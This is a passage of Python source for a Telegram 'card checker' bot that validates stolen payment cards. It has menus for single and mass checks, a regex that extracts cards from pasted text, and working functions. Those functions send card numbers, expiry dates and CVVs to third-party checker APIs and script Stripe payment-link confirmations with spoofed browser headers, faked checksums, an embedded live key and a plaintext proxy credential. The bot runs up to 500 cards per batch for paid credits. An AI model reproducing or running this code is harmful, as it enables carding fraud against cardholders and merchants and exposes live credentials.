📊 **Bot Stats:** Overall bot statistics
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_stats_keyboard()
            )
        
        elif data == "menu_help":
            text = """
ℹ️ **HELP & COMMANDS**
━━━━━━━━━━━━━━━━━━━━

**📋 Card Checking:**
/auth - Single card AUTH check
/charge - Single card CHARGE check
/mauth - Mass AUTH check
/mcharge - Mass CHARGE check

**🛠️ Tools:**
/gen - Generate cards
/bin - BIN lookup
/sort - Sort/extract cards
/split - Split card format
/scan - Scan BIN details

**💰 Credits:**
/credits - View your credits
/redeem - Redeem gift code

**🌐 Proxy:**
/addproxy - Add proxy
/myproxies - View proxies
/removeproxies - Remove all

**👑 Admin Only:**
/gift - Generate gift code
/addcredits - Add user credits
/pro - Promote admin
/demo - Demote admin

━━━━━━━━━━━━━━━━━━━━
💡 Use buttons for easy navigation!
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_main")
            )
        
        elif data == "menu_multiuser":
            text = """
👥 **MULTI-USER SUPPORT**
━━━━━━━━━━━━━━━━━━━━

✅ **Features:**
• Concurrent processing for multiple users
• Individual user queues
• Session management per user
• Credit tracking per user
• Independent checking rates

🚀 **Performance:**
• Up to 8 parallel workers
• Queue-based job management
• Real-time progress updates
• No interference between users

💡 **How it works:**
Each user gets their own:
- Processing queue
- Credit balance
- Check history
- Proxy settings

━━━━━━━━━━━━━━━━━━━━
Your checks never affect other users!
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_main")
            )
        
        elif data == "menu_settings":
            text = f"""
⚙️ **SETTINGS**
━━━━━━━━━━━━━━━━━━━━

👤 **User:** {username}
🆔 **ID:** `{user_id}`

🔧 **Current Settings:**
✅ Animations: Enabled
✅ Real-time updates: On
✅ Multi-user mode: Active
✅ Notifications: On

━━━━━━━━━━━━━━━━━━━━
Contact admin to modify settings
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_main")
            )
        
        # Checker menu callbacks
        elif data == "check_auth":
            text = """
🔍 **SINGLE AUTH CHECK**
━━━━━━━━━━━━━━━━━━━━

**Usage:**
`/auth 4532xxxxxxxx|12|2025|123`

**Format:**
`card_number|month|year|cvv`

**Cost:** 1 credit per check

Send your card to start checking!
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_checker")
            )
        
        elif data == "check_stripe":
            text = """
🔴 **SINGLE STRIPE CHECK**
━━━━━━━━━━━━━━━━━━━━

**Usage:**
`/st 4532xxxxxxxx|12|25|123`

**Format:**
`card_number|month|year|cvv`

**Cost:** 1 credit per check
**Gateway:** Stripe Payment Link

Send your card to start checking!
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_checker")
            )
        
        elif data == "check_mauth":
            text = """
📋 **MASS AUTH CHECK**
━━━━━━━━━━━━━━━━━━━━

**Usage:**
Reply to a .txt file with `/mauth`

**Format in file:**
```
4532xxxxxxxx|12|2025|123
4532xxxxxxxx|01|2026|456
...
```

**Cost:** 1 credit per card
**Max:** 200 cards per file

Upload your file and reply with /mauth!
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_checker")
            )
        
        elif data == "check_mstripe":
            text = """
📊 **MASS STRIPE CHECK**
━━━━━━━━━━━━━━━━━━━━

**Usage:**
Reply to a .txt file with `/mst`

**Format in file:**
```
4532xxxxxxxx|12|25|123
4532xxxxxxxx|01|26|456
...
```

**Cost:** 1 credit per card
**Max:** 500 cards per file
**Gateway:** Stripe Payment Link
**Progress:** Live real-time updates

Upload your file and reply with /mst!
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_checker")
            )
        
        elif data == "check_shopify":
            text = """
🛍️ **SHOPIFY CHECK** (Autoshopify API)
━━━━━━━━━━━━━━━━━━━━

**Choose Check Mode:**

🔵 **Single Check:**
`/shopify https://example.com 4532xxxxxxxx|12|2025|123`

📋 **Mass Check:**
`/mshopify https://example.com [cards]`
Or reply to a .txt file with `/mshopify https://example.com`

**Format:**
`card_number|month|year|cvv`

**Cost:** 1 credit per card

**Site:** Your target website

Start checking now!
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_checker")
            )
        
        elif data == "check_shopify2":
            text = """
🛍️ **SHOPIFY2 CHECK** (2nd API)
━━━━━━━━━━━━━━━━━━━━

**Choose Check Mode:**

🔵 **Single Check:**
`/shopify2 4532xxxxxxxx|12|2025|123`

📋 **Mass Check:**
Reply to a .txt file with `/mshopify2`

**Format:**
`card_number|month|year|cvv`

**Cost:** 1 credit per card

**Gateway:** Shopify Payments
**Proxy:** Live

Start checking now!
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_checker")
            )
        
        elif data == "stats_personal":
            data_dict = load_data()
            user_id_str = str(user_id)
            if user_id_str in data_dict['users']:
                u = data_dict['users'][user_id_str]
                credits = u.get('credits', 0)
                total_checks = u.get('total_checks', 0)
                joined = u.get('joined_date', 'Unknown')
                
                text = f"""
📈 **YOUR STATISTICS**
━━━━━━━━━━━━━━━━━━━━

👤 **Username:** {username}
💰 **Current Credits:** `{credits}`
📊 **Total Checks:** `{total_checks}`
📅 **Member Since:** {joined}

{format_progress_bar(total_checks, total_checks + credits, 15)}

**Performance:**
• Average: {total_checks / max((datetime.now() - datetime.strptime(joined, '%Y-%m-%d %H:%M:%S')).days, 1):.1f} checks/day

Keep checking to improve your stats! 🚀
"""
            else:
                text = "❌ No stats available. Use /register first."
            
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_stats")
            )
        
        elif data.startswith("tool_"):
            tool_name = data.replace("tool_", "")
            text = f"""
🛠️ **TOOL: {tool_name.upper()}**
━━━━━━━━━━━━━━━━━━━━

Please use the command: `/{tool_name}`

Check /help for detailed usage instructions.
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_tools")
            )
        
        # Admin menu
        elif data.startswith("admin_"):
            if not is_admin_uid(user_id):
                await query.answer("⛔ Admin access required!", show_alert=True)
                return
            
            admin_action = data.replace("admin_", "")
            text = f"""
👑 **ADMIN: {admin_action.upper()}**
━━━━━━━━━━━━━━━━━━━━

Use the command: `/{admin_action}`

Admin commands require proper permissions.
"""
            await query.edit_message_caption(
                caption=text,
                parse_mode="HTML",
                reply_markup=create_back_button("menu_main")
            )
        
        else:
            await query.answer("Feature coming soon! 🚀")
            
    except Exception as e:
        logger.exception(f"Callback handler error: {e}")
        await query.answer("❌ An error occurred. Please try again.")

# ---------------- /sort ----------------
async def sort_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg, _, _, _ = get_msg_user_info(update)
    text = None

    if context.args:
        text = " ".join(context.args)
    else:
        full = msg.text or ""
        parts = full.split(maxsplit=1)
        if len(parts) >= 2:
            text = parts[1]

    if not text:
        await msg.reply_text("𝙎𝙀𝙉𝘿 𝙈𝙄𝙓𝙓𝙀𝘿 𝙏𝙀𝙓𝙏 𝙏𝙊 𝙀𝙓𝙏𝙍𝘼𝘾𝙏 𝘾𝘼𝙍𝘿𝙎 𝙁𝙍𝙊𝙈 ↂ \n 𝙐𝙎𝙀 /sort [text containing cards]")
        return

    try:
        pattern = r'(\d{15,16})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
        found_cards = re.findall(pattern, text)

        if not found_cards:
            await msg.reply_text("𝙉𝙊 𝙑𝘼𝙇𝙄𝘿 𝘾𝘼𝙍𝘿𝙎𝙁𝙊𝙐𝙉𝘿 ፠")
            return

        unique_formatted_cards = set()
        for card_tuple in found_cards:
            card_num, month, year_raw, cvv = card_tuple

            if len(year_raw) == 4 and year_raw.startswith("20"):
                year = year_raw[2:]
            else:
                year = year_raw.zfill(2)[-2:]

            month_formatted = month.zfill(2)
            formatted_card = f"{card_num}|{month_formatted}|{year}|{cvv}"
            unique_formatted_cards.add(formatted_card)

        output_text = "\n".join(sorted(unique_formatted_cards))

        if output_text:
            await msg.reply_text(f"```\n{output_text}\n```", parse_mode='HTML')
        else:
            await msg.reply_text("No valid cards were found after formatting.")

    except Exception as e:
        logger.exception(f"An error occurred in /sort command: {e}")
        await msg.reply_text("An error occurred while trying to sort the cards.")

# ---------------- /sh single check ----------------
# ---------------- /sh single check ----------------
# ---------------- /sh single check ----------------
import asyncio
import time
import re
import requests
import logging

logger = logging.getLogger(__name__)

# ======================= STRIPE PAYMENT INTEGRATION =======================
# Stripe Payment Link Constants
STRIPE_BUY_URL = "https://buy.stripe.com/28o2apdMBcTa69G3cf"
STRIPE_PAYMENT_LINK_ID = STRIPE_BUY_URL.rstrip("/").split("/")[-1]
STRIPE_BILLING_EMAIL = "gfdgdfigjdogj@gmail.com"
STRIPE_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0"

# ======================= API INTEGRATIONS =======================
AUTOSHOPIFY_BASE = "https://autoshopify-40u1.onrender.com/shopify"
STRIPE_API_BASE = "https://rzp-production-2493.up.railway.app/stripe_01"
SHOPIFY2_BASE = "https://haters.cxchk.site/shopii"
SHOPIFY2_SITE = "https://keyesco.myshopify.com"
SHOPIFY2_PROXY = "px051003.pointtoserver.com:10780:purevpn0s7397024:6CU9ZvexLGTqpB"
AUTOSHOPIFY_TIMEOUT = 30
STRIPE_TIMEOUT = 30
SHOPIFY2_TIMEOUT = 30

async def shopify_check(site: str, card_text: str) -> dict:
    """
    Check card using Autoshopify API - Returns PURE API RESPONSE
    
    Args:
        site: Website URL to check against (required)
        card_text: Card in format number|mm|yy|cvv
    
    Returns:
        Dict with raw API response (no defaults)
    """
    try:
        # Parse card if needed
        if card_text.count('|') < 3:
            parsed = parse_card_intelligent(card_text)
            if not parsed:
                return {'status': 'Invalid Card Format', 'message': 'Could not parse card', 'raw_response': ''}
            cc_formatted = f"{parsed['number']}|{parsed['month']}|{parsed['year']}|{parsed['cvv']}"
        else:
            cc_formatted = card_text.strip()
        
        # Prepare API request
        params = {
            'site': site.strip(),
            'cc': cc_formatted
        }
        
        # Make GET request
        loop = asyncio.get_event_loop()
        response = await loop.run_in_executor(
            None,
            lambda: requests.get(AUTOSHOPIFY_BASE, params=params, timeout=AUTOSHOPIFY_TIMEOUT)
        )
        
        elapsed = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
        
        # Try to parse JSON response
        try:
            api_data = response.json()
        except:
            api_data = {}
        
        # Return RAW API RESPONSE with parsed fields
        return {
            'status': api_data.get('Status', response.status_code),
            'response': api_data.get('Response', response.text),
            'cc': api_data.get('cc', cc_formatted),
            'message': response.text,
            'elapsed': f"{elapsed:.2f}s",
            'gateway': api_data.get('Gateway', 'UNKNOWN'),
            'price': api_data.get('Price', 0.0),
            'card': cc_formatted,
            'site': site
        }
        
    except asyncio.TimeoutError:
        return {'status': 'Timeout', 'message': 'Request timeout after 30s', 'raw_response': ''}
    except Exception as e:
        return {'status': 'Error', 'message': str(e), 'raw_response': ''}

async def stripe_check(card_text: str) -> dict:
    """
    Check card using Stripe API - Returns PURE API RESPONSE
    
    Args:
        card_text: Card in format number|mm|yy|cvv
    
    Returns:
        Dict with raw API response (no defaults)
    """
    try:
        # Parse card if needed
        if card_text.count('|') < 3:
            parsed = parse_card_intelligent(card_text)
            if not parsed:
                return {'status': 'Invalid Card Format', 'message': 'Could not parse card', 'raw_response': ''}
            cc_formatted = f"{parsed['number']}|{parsed['month']}|{parsed['year']}|{parsed['cvv']}"
        else:
            cc_formatted = card_text.strip()
        
        # Make GET request to Stripe API
        loop = asyncio.get_event_loop()
        url = f"{STRIPE_API_BASE}?lista={cc_formatted}"
        response = await loop.run_in_executor(
            None,
            lambda: requests.get(url, timeout=STRIPE_TIMEOUT)
        )
        
        elapsed = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
        
        # Return RAW API RESPONSE without interpretation
        return {
            'status': response.status_code,
            'message': response.text,
            'response': response.text,
            'elapsed': f"{elapsed:.2f}s",
            'card': cc_formatted,
            'api': 'Stripe'
        }
        
    except asyncio.TimeoutError:
        return {'status': 'Timeout', 'message': 'Request timeout after 30s', 'raw_response': ''}
    except Exception as e:
        return {'status': 'Error', 'message': str(e), 'raw_response': ''}


# ======================= STRIPE PAYMENT LINK CHECKER (aiohttp) =======================

def _rand_id(k=32):
    """Generate random string ID"""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

def _rand_hex(k=64):
    """Generate random hex string"""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

def parse_card_from_text(card_line: str) -> dict:
    """Parse card from text format"""
    card_line = card_line.strip().replace(" ", "")
    if not card_line or '|' not in card_line:
        return None
    parts = card_line.split("|")
    if len(parts) < 4:
        return None
    return {
        "number": parts[0].strip(),
        "exp_month": parts[1].strip().zfill(2),
        "exp_year": parts[2].strip()[-2:],
        "cvc": parts[3].strip(),
        "name": parts[4].strip() if len(parts) > 4 else "Card Holder",
        "email": STRIPE_BILLING_EMAIL,
    }

async def stripe_payment_check(card_text: str, timeout=30) -> dict:
    """
    Check card via Stripe Payment Link using aiohttp
    
    Args:
        card_text: Card in format number|mm|yy|cvv
        timeout: Request timeout in seconds
    
    Returns:
        Dict with check result
    """
    try:
        card = parse_card_from_text(card_text)
        if not card:
            return {"status": "❌", "message": "Invalid card format", "charged": False}
        
        muid = str(uuid.uuid4())
        guid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        stripe_js_id = str(uuid.uuid4())
        
        headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": STRIPE_USER_AGENT,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
        }
        
        async with aiohttp.ClientSession() as session:
            # Step 1: Get payment link info
            payment_link_form = {
                "eid": "NA",
                "browser_locale": "en",
                "browser_timezone": "UTC",
                "referrer_origin": "https://buy.stripe.com",
            }
            
            async with session.post(
                f"https://merchant-ui-api.stripe.com/payment-links/{STRIPE_PAYMENT_LINK_ID}",
                headers=headers,
                data=urlencode(payment_link_form),
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as pl_resp:
                if pl_resp.status != 200:
                    return {"status": "❌", "message": "Failed to get payment link", "charged": False}
                
                pl_data = await pl_resp.json()
                checkout_session_id = pl_data.get("session_id")
                config_id = pl_data.get("config_id")
                pk_live = pl_data.get("public_key") or "pk_live_51QRg19RoxmaXTuY55nJGUChdohsr8gq6tGgVsA6viZ9l6h2UJ2UmyaqM4yng0sjiNhPImBr6XS0KXJY6nvYRVxAq00eT8UvNBF"
            
            if not checkout_session_id:
                return {"status": "❌", "message": "No checkout session", "charged": False}
            
            # Step 2: Create Payment Method
            pm_form = {
                "type": "card",
                "card[number]": card["number"],
                "card[cvc]": card["cvc"],
                "card[exp_month]": card["exp_month"],
                "card[exp_year]": card["exp_year"],
                "billing_details[name]": card["name"],
                "billing_details[email]": card["email"],
                "billing_details[address][country]": "US",
                "guid": guid,
                "muid": muid,
                "sid": sid,
                "key": pk_live,
                "payment_user_agent": "stripe.js/v3",
            }
            
            async with session.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=headers,
                data=urlencode(pm_form),
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as pm_resp:
                if pm_resp.status != 200:
                    return {"status": "❌", "message": "Payment method creation failed", "charged": False}
                
                pm_data = await pm_resp.json()
                if pm_data.get("error"):
                    err = pm_data["error"]
                    return {
                        "status": "❌",
                        "message": err.get("message", "Payment method error"),
                        "charged": False,
                        "decline_code": err.get("decline_code")
                    }
                
                pm_id = pm_data.get("id")
                if not pm_id:
                    return {"status": "❌", "message": "No payment method created", "charged": False}
            
            # Step 3: Confirm Payment
            confirm_form = {
                "eid": "NA",
                "payment_method": pm_id,
                "expected_amount": "100",
                "expected_payment_method_type": "card",
                "guid": guid,
                "muid": muid,
                "sid": sid,
                "key": pk_live,
                "version": "latest",
                "init_checksum": _rand_id(32),
                "js_checksum": _rand_id(50),
                "pxvid": str(uuid.uuid4()),
                "passive_captcha_token": "",
                "client_attribution_metadata[client_session_id]": stripe_js_id,
                "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            }
            
            async with session.post(
                f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
                headers=headers,
                data=urlencode(confirm_form, safe=""),
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as confirm_resp:
                confirm_data = await confirm_resp.json()
                
                if confirm_resp.status == 200 and isinstance(confirm_data.get("id"), str):
                    if "3d" in str(confirm_data).lower():
                        return {"status": "🛡️", "message": "3DS Required", "charged": False, "3ds": True}
                    return {"status": "✅", "message": "Charged", "charged": True}
                
                err = confirm_data.get("error", {})
                if err:
                    decline_code = err.get("decline_code", "")
                    message = err.get("message", "Payment declined")
                    
                    if decline_code:
                        return {"status": "❌", "message": f"{decline_code}: {message}", "charged": False}
                    return {"status": "❌", "message": message, "charged": False}
                
                return {"status": "❌", "message": "Unknown response", "charged": False}
    
    except asyncio.TimeoutError:
        return {"status": "⏱️", "message": "Request timeout", "charged": False}
    except Exception as e:
        logger.exception(f"Stripe payment check error: {e}")
        return {"status": "⚠️", "message": str(e), "charged": False}


async def shopify2_check(card_text: str) -> dict:
    """
    Check card using Shopify2 (Haters.cxchk.site) API - Returns PURE API RESPONSE
    
    Args:
        card_text: Card in format number|mm|yy|cvv
    
    Returns:
        Dict with raw API response
    """
    try:
        # Parse card if needed
        if card_text.count('|') < 3:
            parsed = parse_card_intelligent(card_text)
            if not parsed:
                return {'status': 'Invalid Card Format', 'message': 'Could not parse card', 'raw_response': ''}
            cc_formatted = f"{parsed['number']}|{parsed['month']}|{parsed['year']}|{parsed['cvv']}"
        else:
            cc_formatted = card_text.strip()
        
        # Prepare API request with parameters from config
        params = {
            'site': SHOPIFY2_SITE,
            'cc': cc_formatted,
            'proxy': SHOPIFY2_PROXY
        }
        
        # Make GET request
        loop = asyncio.get_event_loop()
        response = await loop.run_in_executor(
            None,
            lambda: requests.get(SHOPIFY2_BASE, params=params, timeout=SHOPIFY2_TIMEOUT)
        )
        
        elapsed = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
        
        # Return RAW API RESPONSE without interpretation
        return {
            'status': response.status_code,
            'message': response.text,
            'response': response.text,
            'elapsed': f"{elapsed:.2f}s",
            'card': cc_formatted,
            'api': 'Shopify2'
        }
        
    except asyncio.TimeoutError:
        return {'status': 'Timeout', 'message': 'Request timeout after 30s', 'raw_response': ''}
    except Exception as e:
        return {'status': 'Error', 'message': str(e), 'raw_response': ''}


async def shopify_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /shopify <site> <card>
    Single card check against Shopify site - Returns PURE API RESPONSE
    
    Usage: /shopify https://example.com 4532015112830366|12|25|123
    """
    msg, user, user_id, username = get_msg_user_info(update)
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits <= 0:
        await msg.reply_text("❌ Insufficient credits. Use /redeem to get credits.")
        return
    
    # Parse arguments
    if not context.args or len(context.args) < 2:
        await msg.reply_text(
            "❌ Invalid format.\n\n"
            "Usage: /shopify <site_url> <card>\n\n"
            "Example:\n"
            "/shopify https://example.com 4532015112830366|12|25|123"
        )
        return
    
    site = context.args[0]
    card_text = context.args[1]
    
    # Validate site URL
    if not site.startswith(('http://', 'https://')):
        site = 'https://' + site
    
    # Send checking message
    checking_msg = await msg.reply_text("🔍 Checking card...")
    
    try:
        # Deduct credit
        deduct_credit(user_id)
        
        # Check card
        result = await shopify_check(site, card_text)
        
        # Format response - PURE API RESPONSE
        safe_card = result['cc'].replace('_', r'\_').replace('*', r'\*')
        api_response = result['response'].replace('`', '\\`').replace('*', '\\*')[:3000]
        
        response_text = f"""
🛍️ **SHOPIFY CHECK** (AUTOSHOPIFY API)
━━━━━━━━━━━━━━━━━━━━
💳 Card: `{safe_card}`
🌐 Site: `{site[:40]}`
📊 Status Code: {result['status']}
⏱️ Time: {result['elapsed']}

📝 **API Response:**
```
{api_response}
```

👤 Checked by: @{username}
━━━━━━━━━━━━━━━━━━━━
"""
        
        await checking_msg.edit_text(response_text, parse_mode='HTML')
        
    except Exception as e:
        logger.exception(f"shopify_cmd error: {e}")
        await checking_msg.edit_text(f"❌ Error: {str(e)[:100]}")

async def stripe_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /stripe <card>
    Single card check via Stripe API - Returns PURE API RESPONSE
    
    Usage: /stripe 4532015112830366|12|25|123
    """
    msg, user, user_id, username = get_msg_user_info(update)
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits <= 0:
        await msg.reply_text("❌ Insufficient credits. Use /redeem to get credits.")
        return
    
    # Parse arguments
    if not context.args:
        await msg.reply_text(
            "❌ Invalid format.\n\n"
            "Usage: /stripe <card>\n\n"
            "Example:\n"
            "/stripe 4532015112830366|12|25|123"
        )
        return
    
    card_text = " ".join(context.args)
    
    # Send checking message
    checking_msg = await msg.reply_text("🔍 Checking card via Stripe...")
    
    try:
        # Deduct credit
        deduct_credit(user_id)
        
        # Check card
        result = await stripe_check(card_text)
        
        # Format response - PURE API RESPONSE
        safe_card = result['card'].replace('_', r'\_').replace('*', r'\*')
        api_response = result['message'].replace('`', '\\`').replace('*', '\\*')[:3000]
        
        response_text = f"""
🎯 **STRIPE CHECK**
━━━━━━━━━━━━━━━━━━━━
💳 Card: `{safe_card}`
📊 Status Code: {result['status']}
⏱️ Time: {result['elapsed']}

📝 **API Response:**
```
{api_response}
```

👤 Checked by: @{username}
━━━━━━━━━━━━━━━━━━━━
"""
        
        await checking_msg.edit_text(response_text, parse_mode='HTML')
        
    except Exception as e:
        logger.exception(f"stripe_cmd error: {e}")
        await checking_msg.edit_text(f"❌ Error: {str(e)[:100]}")


# ======================= STRIPE PAYMENT LINK CHECKER COMMANDS =======================

async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /st <card> - Single Stripe Payment Link check
    Format: /st 4532xxxxxxxx|12|25|123
    """
    msg, user, user_id, username = get_msg_user_info(update)
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits <= 0:
        await msg.reply_text("❌ Insufficient credits. Use /redeem to get credits.")
        return
    
    # Parse card
    if not context.args:
        await msg.reply_text(
            "❌ Invalid format.\n\n"
            "Usage: /st <card>\n\n"
            "Example:\n"
            "/st 4532015112830366|12|25|123"
        )
        return
    
    card_text = " ".join(context.args)
    
    # Send checking message
    checking_msg = await msg.reply_text("⏳ Checking card via Stripe Payment Link...")
    
    try:
        # Deduct credit
        deduct_credit(user_id)
        
        # Check card
        result = await stripe_payment_check(card_text)
        
        # Format response
        safe_card = card_text.replace('|', ' | ').replace('_', r'\_')
        status_emoji = result.get("status", "⚠️")
        message = result.get("message", "Unknown")
        charged = "✅ YES" if result.get("charged") else "❌ NO"
        
        response_text = f"""
{status_emoji} **STRIPE PAYMENT CHECK**
━━━━━━━━━━━━━━━━━━━━
💳 Card: `{safe_card}`
📊 Status: {message}
💰 Charged: {charged}

👤 Checked by: @{username}
━━━━━━━━━━━━━━━━━━━━
"""
        
        await checking_msg.edit_text(response_text, parse_mode='HTML')
        
    except Exception as e:
        logger.exception(f"st_command error: {e}")
        await checking_msg.edit_text(f"❌ Error: {str(e)[:100]}")


STRIPE_MASS_GLOBALS = {
    "checked": 0,
    "charged": 0,
    "declined": 0,
    "3ds": 0,
    "errors": 0,
    "stop": False
}

async def process_mass_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, username: str):
    """Process mass Stripe payment checks with live progress bar"""
    msg, user, user_id, _ = get_msg_user_info(update)
    
    if not cards:
        await msg.reply_text("❌ No cards to check")
        return
    
    total_cards = len(cards)
    if total_cards > 500:
        await msg.reply_text(f"⚠️ Too many cards! Max: 500, Got: {total_cards}")
        return
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits < total_cards:
        await msg.reply_text(f"❌ Not enough credits. Need: {total_cards}, Have: {credits}")
        return
    
    # Deduct credits upfront
    deduct_credit(user_id, total_cards)
    
    # Reset globals
    STRIPE_MASS_GLOBALS["checked"] = 0
    STRIPE_MASS_GLOBALS["charged"] = 0
    STRIPE_MASS_GLOBALS["declined"] = 0
    STRIPE_MASS_GLOBALS["3ds"] = 0
    STRIPE_MASS_GLOBALS["errors"] = 0
    STRIPE_MASS_GLOBALS["stop"] = False
    
    # Send start message
    await msg.reply_text(f"🚀 Starting Stripe mass check on {total_cards} cards...")
    
    # Send progress message
    progress_msg = await msg.reply_text("⏳ Initializing...")
    start_time = time.time()
    
    # Process cards
    for i, card in enumerate(cards):
        if STRIPE_MASS_GLOBALS["stop"]:
            break
        
        try:
            result = await stripe_payment_check(card.strip())
            STRIPE_MASS_GLOBALS["checked"] += 1
            
            if result.get("charged"):
                STRIPE_MASS_GLOBALS["charged"] += 1
            elif result.get("3ds"):
                STRIPE_MASS_GLOBALS["3ds"] += 1
            else:
                STRIPE_MASS_GLOBALS["declined"] += 1
                
        except Exception as e:
            STRIPE_MASS_GLOBALS["errors"] += 1
            logger.warning(f"Card check error: {e}")
        
        # Update progress every 5 cards or at end
        if (i + 1) % 5 == 0 or (i + 1) == total_cards:
            elapsed = time.time() - start_time
            speed = STRIPE_MASS_GLOBALS["checked"] / elapsed if elapsed > 0 else 0
            
            progress_bar = "█" * (STRIPE_MASS_GLOBALS["checked"] // (total_cards // 20 + 1)) + "░" * (20 - (STRIPE_MASS_GLOBALS["checked"] // (total_cards // 20 + 1)))
            
            progress_text = f"""
⚡ **STRIPE MASS CHECK IN PROGRESS**
━━━━━━━━━━━━━━━━━━━━
📊 Progress: {STRIPE_MASS_GLOBALS['checked']}/{total_cards}
{progress_bar}

💰 Charged: {STRIPE_MASS_GLOBALS['charged']} ✅
🚫 Declined: {STRIPE_MASS_GLOBALS['declined']} ❌
🛡️ 3DS: {STRIPE_MASS_GLOBALS['3ds']} 🔒
⚠️ Errors: {STRIPE_MASS_GLOBALS['errors']} ⚠️

⏱️ Time: {elapsed:.1f}s
🔥 Speed: {speed:.1f} cards/sec
━━━━━━━━━━━━━━━━━━━━
"""
            try:
                await progress_msg.edit_text(progress_text, parse_mode='HTML')
            except Exception:
                pass
            
            # Add small delay to avoid rate limiting
            await asyncio.sleep(0.2)
    
    # Final results
    total_time = time.time() - start_time
    remaining_credits = get_user_credits(user_id)
    
    results_text = f"""
✅ **STRIPE MASS CHECK COMPLETE**
━━━━━━━━━━━━━━━━━━━━
📊 **Statistics:**
• Processed: {STRIPE_MASS_GLOBALS['checked']}/{total_cards}
• Charged: {STRIPE_MASS_GLOBALS['charged']} 💰
• Declined: {STRIPE_MASS_GLOBALS['declined']} ❌
• 3DS: {STRIPE_MASS_GLOBALS['3ds']} 🛡️
• Errors: {STRIPE_MASS_GLOBALS['errors']} ⚠️

⏱️ **Timing:**
• Total: {total_time:.2f}s
• Avg: {total_time/total_cards:.2f}s/card
• Speed: {total_cards/total_time:.1f} cards/sec

💳 **Credits:**
• Remaining: {remaining_credits}

👤 Checked by: @{username}
━━━━━━━━━━━━━━━━━━━━
"""
    
    await context.bot.send_message(chat_id=msg.chat.id, text=results_text, parse_mode='HTML')


async def mst_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /mst - Mass Stripe payment link check from file
    Reply to a .txt file with /mst
    """
    msg, user, user_id, username = get_msg_user_info(update)
    
    if not msg.reply_to_message or not msg.reply_to_message.document:
        # Try inline cards if provided
        if context.args:
            cards_text = " ".join(context.args)
            cards = [c.strip() for c in cards_text.split('\n') if c.strip()]
            if cards:
                asyncio.create_task(process_mass_stripe(update, context, cards, username))
                return
        
        await msg.reply_text(
            "❌ Please reply to a .txt file or provide cards inline.\n\n"
            "Usage:\n"
            "1. Reply to file: Reply to .txt file and send `/mst`\n"
            "2. Inline: `/mst card1|mm|yy|cvv card2|mm|yy|cvv`"
        )
        return
    
    doc = msg.reply_to_message.document
    
    if not doc.file_name.lower().endswith('.txt'):
        await msg.reply_text("❌ File must be .txt format")
        return
    
    try:
        # Download file
        file = await context.bot.get_file(doc.file_id)
        file_data = await file.download_as_bytearray()
        cards_text = file_data.decode('utf-8', errors='ignore')
        
        # Parse cards
        cards = [c.strip() for c in cards_text.split('\n') if c.strip() and '|' in c]
        
        if not cards:
            await msg.reply_text("❌ No valid cards found in file")
            return
        
        asyncio.create_task(process_mass_stripe(update, context, cards, username))
        
    except Exception as e:
        logger.exception(f"mst_command error: {e}")
        await msg.reply_text(f"❌ Error: {str(e)[:100]}")


async def shopify2_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /shopify2 <card>
    Single card check via Shopify2 (Haters) API - Returns PURE API RESPONSE
    
    Usage: /shopify2 4532015112830366|12|25|123
    """
    msg, user, user_id, username = get_msg_user_info(update)
    
    # Check credits
    credits = get_user_credits(user_id)
    if credits <= 0:
        await msg.reply_text("❌ Insufficient credits. Use /redeem to get credits.")
        return
    
    # Parse arguments
    if not context.args:
        await msg.reply_text(
            "❌ Invalid format.\n\n"
            "Usage: /shopify2 <card>\n\n"
            "Example:\n"
            "/shopify2 4532015112830366|12|25|123"
        )
        return
    
    card_text = " ".join(context.args)
    
    # Send checking message
    checking_msg = await msg.reply_text("🔍 Checking card via Shopify2 (Haters)...")
    
    try:
        # Deduct credit
        deduct_credit(user_id)
        
        # Check card
